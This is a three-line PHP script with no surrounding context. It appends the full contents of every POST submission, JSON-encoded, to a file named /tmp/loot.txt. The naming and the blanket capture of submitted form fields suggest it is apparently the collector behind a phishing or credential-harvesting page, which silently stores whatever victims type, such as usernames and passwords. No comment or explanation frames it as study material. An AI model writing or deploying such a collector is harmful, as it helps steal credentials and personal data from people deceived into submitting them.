<?php
file_put_contents('/tmp/loot.txt', json_encode($_POST) . PHP_EOL, FILE_APPEND);
?>